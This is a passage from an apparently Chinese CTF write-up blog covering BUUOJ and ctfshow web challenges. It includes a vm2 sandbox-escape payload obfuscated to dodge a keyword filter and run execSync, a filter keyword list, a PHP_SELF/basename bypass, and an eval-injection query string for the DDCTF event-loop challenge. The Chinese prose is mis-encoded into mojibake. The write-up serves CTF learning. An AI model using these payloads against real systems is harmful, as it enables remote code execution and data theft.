<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"code"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'code'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»™çš„æ˜¯ç”¨phpå†™çš„ç ï¼Œevalå‡½æ•°åœ¨phpå’Œnode.jsä¸­éƒ½æœ‰ï¼Œé‚£å°±çœ‹çœ‹nodejsæŠ¥é”™ä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error</span><br><span class="line">    at vm.js:1:1</span><br><span class="line">    at Script.runInContext (vm.js:131:20)</span><br><span class="line">    at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62)</span><br><span class="line">    at &#x2F;app&#x2F;server.js:51:33</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çœ‹wpæ¥åšäº†ï¼Œè¯´æ˜¯vm2æ²™ç®±é€ƒé€¸</p>
<p>è¿™é¢˜wafäº†ä¸€äº›ä¸œè¥¿ï¼Œæœæ¥çš„pocä¸èƒ½ç›´æ¥æ‰“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰¾äº†ä¸ªèƒ½ç”¨çš„payloadï¼Œnodejsä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡åšï¼Œæ²¡æ¥è§¦è¿‡</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<h3 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä»£ç ï¼Œflagå†™åœ¨äº†config.phpæ–‡ä»¶ä¸­ï¼Œä½†æ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥è¯»å–ï¼Œå¯¹config.phpè¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤ï¼Œbasename()å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æ„é€ ç©ºå­—èŠ‚æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œ%00æ²¡æœ‰ç”¨ï¼ŒæŸ¥äº†ä¸€ä¸‹è¿˜æœ‰ä¸€ä¸ª%ffï¼ŒæˆåŠŸ</p>
<img src="/2020/05/29/buuoj4/15.png" class="">

<h3 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h3><p>flagè¦æœ‰äº”ä¸ªé’»çŸ³æ‰èƒ½ä¹°ï¼Œä¸€åˆ†ä¸€é’»çŸ³ï¼Œåªæœ‰ä¸‰åˆ†ï¼Œè¦æƒ³åŠæ³•æåˆ°äº”ä¸ªç§¯åˆ†</p>
<p>å…ˆæ¥çœ‹çœ‹æºç å§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66147e857'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'*********************'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>://</span><br><span class="line">        <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]//ä»é˜Ÿåˆ—ä¸­å–å‡ºé˜Ÿå¤´å…ƒç´ </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>))://ä¸ç¬¦åˆç»§ç»­å¾ªç¯</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                    action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">''</span></span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">''</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>:</span><br><span class="line">        resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">'log'</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(</span><br><span class="line">        session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">        html = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>, <span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">' '</span>, <span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>, <span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(</span><br><span class="line">        num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>æ¥çœ‹çœ‹å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(</span><br><span class="line">        num_items), <span class="string">'action:view;index'</span>])</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šå¯¹num_itemså…ˆè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸å¤Ÿå°±ä¼šå…ˆåŠ ä¸Š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure>

<p>å¯¹pointsåˆ¤æ–­ï¼Œå¦‚æœå°äºå°†è¦æ¶ˆè´¹çš„æ•°ç›®ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”æ‰£é™¤æ¶ˆè´¹çš„æ•°ç›®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure>

<p>åªè¦sessionä¸­num_itemsçš„å€¼å¤§äº5å°±èƒ½å¤Ÿæ‹¿åˆ°flag</p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯è¦å…ˆéª—åˆ°äº”ä¸ªé’»çŸ³ï¼Œä¹‹åæ‹¿ç€flagè·‘å°±è¡Œäº†</p>
<p>åœ¨execute_event_loop()å‡½æ•°ä¸­æœ‰å…³é”®éƒ¨åˆ†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">event_handler = eval(</span><br><span class="line">                    action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br></pre></td></tr></table></figure>

<p>evalå¯ä»¥å†™å…¥è¯­å¥å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œåªè¦è®©buy_handlerå’Œget_flag_handlerå…ˆè¿›å…¥é˜Ÿåˆ—ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾¾åˆ°ç›®çš„ï¼ŒåŒæ—¶è¿™é‡Œçš„actioné€šè¿‡#å¯ä»¥æ³¨é‡Šåé¢çš„æ£€æµ‹æ‹¼æ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br></pre></td></tr></table></figure>

<p>trigger_eventæ§åˆ¶ç€é˜Ÿåˆ—çš„è¿›å‡ºï¼Œè¿™æ ·å°±è”ç³»èµ·æ¥äº†ï¼Œåªè¦è®©evalæ‰§è¡Œtrigger_eventï¼Œå†å°†buyå’Œget_flagä¼ å…¥ï¼Œå°±ä¼šå…ˆä¸€æ­¥è¿›å…¥é˜Ÿåˆ—</p>
<p>get_mid_str(event, â€˜:â€™, â€˜;â€™),è¿™ä¸ªå‡½æ•°ä¼šæ‰¾ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ï¼Œç¬¬äºŒä¸ªå‚æ•°å’Œç¬¬ä¸‰ä¸ªå‚æ•°ä¹‹é—´çš„å­—ç¬¦ä¸²</p>
<p>pocï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;2%23action:buy;3%23action:get_flag;%23</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ï¼Œaction:buy;ç»è¿‡get_mid_strå‡½æ•°å’Œevalæ‹¼æ¥å°±å˜æˆäº†buy_handler(5)ï¼Œåé¢çš„å·®ä¸å¤šç†è§£å°±å¯ä»¥äº†</p>
<p>ç„¶åå°±æ˜¯æ‰“è¿‡å»ï¼Œè¿™é‡Œè¦ç”¨åˆ°å·¥å…·ï¼Œé™„ä¸ŠGitHubåœ°å€ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p>
<img src="/2020/05/29/buuoj4/16.png" class="">

<p>ä¹‹åæ•°æ®base64è§£å¯†å³å¯</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow</title>
    <url>/2020/05/05/ctfshow/</url>
    <content><![CDATA[<h1 id="36Dæ¯"><a href="#36Dæ¯" class="headerlink" title="36Dæ¯"></a>36Dæ¯</h1><a id="more"></a>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="0X01-ä½ å–å§"><a href="#0X01-ä½ å–å§" class="headerlink" title="0X01:ä½ å–å§"></a>0X01:ä½ å–å§</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸¤ç§è§£æ³•ï¼Œåˆ†åˆ«æ˜¯Yingå¸ˆå‚…å’ŒHA1C9ONå¸ˆå‚…çš„ï¼Œä¸‹é¢æ¥å°è¯•ä¸€ä¸‹</p>
